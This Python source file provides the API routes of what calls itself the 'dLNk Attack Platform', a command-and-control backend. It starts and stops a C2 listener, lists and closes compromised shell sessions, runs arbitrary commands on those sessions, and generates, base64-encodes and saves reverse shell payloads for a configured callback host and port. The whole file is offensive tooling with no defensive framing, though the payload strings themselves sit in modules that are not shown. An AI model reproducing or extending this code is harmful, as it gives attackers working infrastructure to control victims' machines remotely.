"""
dLNk Attack Platform - C2 Shell Management API Routes
"""

from fastapi import APIRouter, HTTPException
from typing import List, Dict, Optional
from pydantic import BaseModel
from core.shell_handler import get_shell_handler
from core.reverse_shell_payloads import get_reverse_shell_generator
from loguru import logger

# Note: API key verification will be handled by main.py dependencies

router = APIRouter(prefix="/api/c2", tags=["C2 & Shell Management"])


class CommandRequest(BaseModel):
    command: str


class CommandResponse(BaseModel):
    session_id: str
    command: str
    result: str
    success: bool


class PayloadRequest(BaseModel):
    payload_type: Optional[str] = "bash"
    lhost: Optional[str] = None
    lport: Optional[int] = None


@router.get("/status")
async def get_c2_status():
    """Get C2 listener status"""
    try:
        handler = get_shell_handler()
        return {
            "listener_running": handler.is_running,
            "host": handler.host,
            "port": handler.port,
            "active_sessions": len([s for s in handler.sessions.values() if s.is_active]),
            "total_sessions": len(handler.sessions)
        }
    except Exception as e:
        logger.error(f"[C2API] Status error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/start")
async def start_c2_listener():
    """Start C2 listener"""
    try:
        handler = get_shell_handler()
        if handler.is_running:
            return {"message": "C2 listener already running", "status": "running"}
        
        success = await handler.start_listener()
        if success:
            return {
                "message": "C2 listener started successfully",
                "status": "running",
                "host": handler.host,
                "port": handler.port
            }
        else:
            raise HTTPException(status_code=500, detail="Failed to start C2 listener")
    except Exception as e:
        logger.error(f"[C2API] Start error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/stop")
async def stop_c2_listener():
    """Stop C2 listener"""
    try:
        handler = get_shell_handler()
        handler.stop_listener()
        return {"message": "C2 listener stopped", "status": "stopped"}
    except Exception as e:
        logger.error(f"[C2API] Stop error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/sessions")
async def list_sessions() -> List[Dict]:
    """List all shell sessions"""
    try:
        handler = get_shell_handler()
        sessions = handler.get_sessions()
        return sessions
    except Exception as e:
        logger.error(f"[C2API] List sessions error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/sessions/{session_id}")
async def get_session(session_id: str):
    """Get specific session details"""
    try:
        handler = get_shell_handler()
        session = handler.get_session(session_id)
        if not session:
            raise HTTPException(status_code=404, detail="Session not found")
        return session
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"[C2API] Get session error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/sessions/{session_id}/execute")
async def execute_command(
    session_id: str,
    request: CommandRequest
) -> CommandResponse:
    """Execute command on shell session"""
    try:
        handler = get_shell_handler()
        result = handler.execute_command(session_id, request.command)
        
        if result is None:
            raise HTTPException(status_code=404, detail="Session not found or inactive")
        
        return CommandResponse(
            session_id=session_id,
            command=request.command,
            result=result,
            success=True
        )
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"[C2API] Execute command error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.delete("/sessions/{session_id}")
async def close_session(session_id: str):
    """Close a shell session"""
    try:
        handler = get_shell_handler()
        success = handler.close_session(session_id)
        
        if not success:
            raise HTTPException(status_code=404, detail="Session not found")
        
        return {"message": "Session closed successfully", "session_id": session_id}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"[C2API] Close session error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/payloads")
async def get_all_payloads():
    """Get all reverse shell payloads"""
    try:
        generator = get_reverse_shell_generator()
        payloads = generator.generate_all_payloads()
        return {
            "lhost": generator.lhost,
            "lport": generator.lport,
            "payloads": payloads
        }
    except Exception as e:
        logger.error(f"[C2API] Get payloads error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/payloads/{payload_type}")
async def get_payload(payload_type: str):
    """Get specific payload type"""
    try:
        generator = get_reverse_shell_generator()
        payloads = generator.generate_all_payloads()
        
        if payload_type not in payloads:
            raise HTTPException(
                status_code=404,
                detail=f"Payload type '{payload_type}' not found. Available: {list(payloads.keys())}"
            )
        
        return {
            "payload_type": payload_type,
            "lhost": generator.lhost,
            "lport": generator.lport,
            "payload": payloads[payload_type],
            "encoded": generator.encode_base64(payloads[payload_type])
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"[C2API] Get payload error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/payloads/save")
async def save_payloads():
    """Save all payloads to file"""
    try:
        generator = get_reverse_shell_generator()
        filepath = generator.save_payloads()
        return {
            "message": "Payloads saved successfully",
            "filepath": filepath
        }
    except Exception as e:
        logger.error(f"[C2API] Save payloads error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

